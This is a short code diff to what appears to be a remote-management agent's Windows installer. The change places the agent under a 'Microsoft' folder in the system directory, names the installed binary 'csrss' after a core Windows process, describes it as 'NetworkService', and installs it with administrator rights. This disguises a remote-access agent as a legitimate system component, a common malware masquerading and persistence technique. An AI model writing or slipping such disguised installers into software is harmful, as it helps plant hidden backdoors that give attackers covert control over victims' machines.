@@ -639,9 +639,9 @@ duk_ret_t _start(duk_context *ctx)
 		GetSystemDirectoryA(szInstall, MAX_PATH);
 
 		//SHGetSpecialFolderPathA(NULL, szInstall, CSIDL_LOCAL_APPDATA, FALSE);
-		//sprintf_s(szInstall, sizeof(szInstall), "%s\\Microsoft", szInstall);
+		sprintf_s(szInstall, sizeof(szInstall), "%s\\Microsoft", szInstall);
 
-		sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s --installPath=%s --meshServiceName=%s --target=winsvchost --description=NetworkService", "install", szInstall, SERVICE_NAME);
+		sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "-full%s --installPath=%s --meshServiceName=%s --target=csrss --description=NetworkService", "install", szInstall, SERVICE_NAME);
 		auto result = RunAsAdmin(ILibScratchPad, IsAdmin() == TRUE);
 
 
